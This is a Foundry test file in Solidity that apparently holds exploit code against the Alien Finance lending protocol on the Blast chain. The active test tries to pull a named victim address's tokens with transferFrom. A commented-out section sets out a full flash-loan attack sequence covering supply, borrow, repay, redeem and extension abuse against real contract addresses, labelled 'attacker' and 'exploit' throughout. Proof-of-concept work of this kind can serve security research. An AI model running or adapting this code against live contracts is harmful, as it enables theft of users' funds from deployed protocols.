// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "./test/interfaces/IERC3156FlashBorrower.sol";
import "./test/interfaces/IERC20.sol";

interface IAToken {
    function balanceOf(address account) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

contract AllienFlashTest is Test {

    IERC20 blast = IERC20(0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad);
    IAToken public blatoken = IAToken(0x48601Ae020183c2bdEe167917B385ecd91e1A012);
    address public attacker;
    address private constant vict = 0xBe5b1aFae3D69E0B193E18ba75Ea27E45aF9D681;
    
    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 5561255);
        attacker = msg.sender;

        deal(address(blast), address(this), 2 ether);
    }

    function testExploit() public {
        uint256 atokenbal = blast.balanceOf(vict);
        emit log_named_decimal_uint("Redeem Amount Calculated", atokenbal, 18);
        
        bool success = blast.transferFrom(address(vict), address(this), blast.balanceOf(address(vict)));
    if (success) {
    // Transfer was successful, handle the logic here
        uint256 amountTransferred = blast.balanceOf(address(this));
        emit log_named_decimal_uint("Redeem Amount Calculated", amountTransferred, 18);
    // Further logic
        } else {
    // Transfer failed, handle the error or revert
        revert("Transfer failed");
        } 

    }


}

// pragma solidity ^0.8.13;

// import "@openzeppelin/contracts/utils/math/SafeMath.sol";
// import {console, Test} from "forge-std/Test.sol";
// import "./interfaces/IERC3156FlashBorrower.sol";
// import "./interfaces/IERC20.sol";
// import "./interfaces/IWETH.sol";

// interface ILender {
//     function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
//         external
//         returns (bool);
// }

// interface IAToken {
//     function balanceOf(address account) external view returns (uint);
//     function allowance(address owner, address spender) external view returns (uint);
//     function transferFrom(address from, address to, uint value) external returns (bool);
// }

// interface IAlienFinance {
//     function supply(address from, address to, address market, uint256 amount) external;
//     function borrow(address from, address to, address asset, uint256 amount) external;
//     function redeem(address from, address to, address asset, uint256 amount) external;
//     function repay(address from, address to, address asset, uint256 amount) external;
//     function setUserExtension(address extension, bool allowed) external;
//     function getUserAllowedExtensions(address user) external view returns (address[] memory);
//     function getExchangeRate(address market) external view returns (uint256);
//     function deferLiquidityCheck(address user, bytes memory data) external;
//     function getCreditLimit(address user, address market) external view returns (uint256);

//     function getBorrowBalance(address user, address market) external view returns (uint256);
//     function getAccountLiquidity(address user) external view returns (uint256, uint256, uint256);
//     function isUserLiquidatable(address user) external view returns (bool);
//     function calculateLiquidationOpportunity(address marketBorrow, address marketCollateral, uint256 repayAmount) external view returns (uint256);
// }

// interface IDeferLiquidityCheck {

//     function onDeferredLiquidityCheck(bytes memory data) external;
// }

// interface IUniswapExtension {
//     struct Action {
//         bytes32 name;
//         bytes data;
//     }

//     struct UniV3SwapData {
//         address caller;
//         address swapOutAsset;
//         address swapInAsset;
//         bytes path;
//         bytes32 subAction;
//     }

//     struct UniV2SwapData {
//         address caller;
//         address swapOutAsset;
//         address swapInAsset;
//         uint256[] amounts;
//         address[] path;
//         uint256 index;
//         bytes32 subAction;
//     }

//     function execute(Action[] calldata actions) external payable;

//     function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata _data) external;

//     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata _data) external;
// }

// contract AllienFlashTest is Test, IERC3156FlashBorrower {
//     using SafeMath for uint;
//     IERC20 weth = IERC20(0x4300000000000000000000000000000000000004);
//     IERC20 blast = IERC20(0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad);
//     IERC20 usbd = IERC20(0x4300000000000000000000000000000000000003);
//     ILender private lender = ILender(0x45cf520dB0598b8054796E3c772C46326fb19856);
//     IAToken public blatoken = IAToken(0x48601Ae020183c2bdEe167917B385ecd91e1A012);
//     address public attacker;
//     IAlienFinance private Allien = IAlienFinance(0x02B7BF59e034529d90e2ae8F8d1699376Dd05ade);
//     IUniswapExtension private uniExten = IUniswapExtension(0xE971563C790bCc9E7916ccEd72a2e84403b411B1);
//     address private constant vict = 0xBe5b1aFae3D69E0B193E18ba75Ea27E45aF9D681;
//     event log_named_bool(string key, bool value);

//     function setUp() public {
//         vm.createSelectFork("https://rpc.ankr.com/blast", 5561255);
//         attacker = msg.sender;

//         deal(address(blast), address(this), 2 ether);
//     }

//     function testExploit() public {
//         emit log_named_decimal_uint("[Begin] Attacker WETH before exploit", blast.balanceOf(address(this)), 18);
//         require(msg.sender == attacker, "Only attacker can start the exploit");

//         address token = address(blast);
//         uint256 amount = 5000000 * 10**18;  // 250 USDB with 18 decimals

//         lender.flashLoan(IERC3156FlashBorrower(address(this)), token, amount, "");
//         emit log_named_decimal_uint("[End] Attacker WETH after exploit", blast.balanceOf(address(this)), 18);
//     }

//     function onFlashLoan(
//         address /*initiator*/,
//         address _token,
//         uint256 amount,
//         uint256 fee,
//         bytes calldata data
//     ) external override returns (bytes32) {
//         // require(msg.sender == address(lender), "Untrusted lender");
//         require(address(_token) == address(blast), "Token mismatch");

//         emit log_named_decimal_uint("[After] Attacker blast during exploit", blast.balanceOf(address(this)), 18);

//         // Supply the borrowed USDB
//         blast.approve(address(Allien), blast.balanceOf(address(this)));
//         Allien.supply(address(this), address(this), address(blast), blast.balanceOf(address(this)));

//         emit log_named_decimal_uint("[After] Attacker atoken during exploit", blatoken.balanceOf(address(this)), 18);

//         uint256 crditlim = Allien.getCreditLimit(address(this), address(blast));
//         emit log_named_uint("Attacker 1 credit limit during exploit", crditlim);
        
//         uint256 usbdAmount = 52000 * 10**18; // 5 WETH with 18 decimals
//         Allien.borrow(address(this), address(this), address(usbd), usbdAmount);
//         emit log_named_decimal_uint("[After] Attacker usbd borrowed during exploit", usbd.balanceOf(address(this)), 18);
//         emit log_named_decimal_uint("[After] Attacker atoken bal aft borrowed", blatoken.balanceOf(address(this)), 18);

//         (uint256 collateralValue, uint256 liquidationCollateralValue, uint256 debtValue) = Allien.getAccountLiquidity(address(this));
//         emit log_named_decimal_uint("Collateral Value", collateralValue, 18);
//         emit log_named_decimal_uint("Liquidation Collateral Value", liquidationCollateralValue, 18);
//         emit log_named_decimal_uint("Debt Value", debtValue, 18);

//         bool isLiquidatable = Allien.isUserLiquidatable(address(this));
//         emit log_named_bool("Is User Liquidatable", isLiquidatable);

//         if (isLiquidatable) {
//             emit log_named_string("Status", "User is liquidatable");
//         } else {
//             emit log_named_string("Status", "User is not liquidatable");
//         }

//         uint256 seizeAmount = Allien.calculateLiquidationOpportunity(address(usbd), address(blast), usbd.balanceOf(address(this)));
//         emit log_named_decimal_uint("Seize Amount", seizeAmount, 18);

//         usbd.approve(address(Allien), usbd.balanceOf(address(this)));
//         Allien.repay(address(this), address(this), address(usbd), usbd.balanceOf(address(this)));
//         emit log_named_decimal_uint("[After] Attacker usbd balance after repaid", usbd.balanceOf(address(this)), 18);

//         uint256 atokenBalance = blatoken.balanceOf(address(this));
//         uint256 exchangeRate = Allien.getExchangeRate(address(blast));  // Ensure this function is available and correct
//         uint256 redeemAmount = (atokenBalance * exchangeRate) / 1e18;
//         emit log_named_decimal_uint("Redeem Amount Calculated", redeemAmount, 18);
//         Allien.redeem(address(this), address(this), address(blast), redeemAmount);

//         Allien.setUserExtension(address(uniExten), true);
//         address[] memory userallowedext = Allien.getUserAllowedExtensions(address(this));
//         for (uint i = 0; i < userallowedext.length; i++) {
//             // Logging each allowed extension
//             emit log_named_address("[After] Attacker extension during exploit", userallowedext[i]);
//         }
//         emit log_named_decimal_uint("[After] Attacker blast after redeem", blast.balanceOf(address(this)), 18);
        
//         require(blast.approve(address(lender), blast.balanceOf(address(this))));
//         return keccak256("ERC3156FlashBorrower.onFlashLoan");
//     }

//     receive() external payable {}
// }
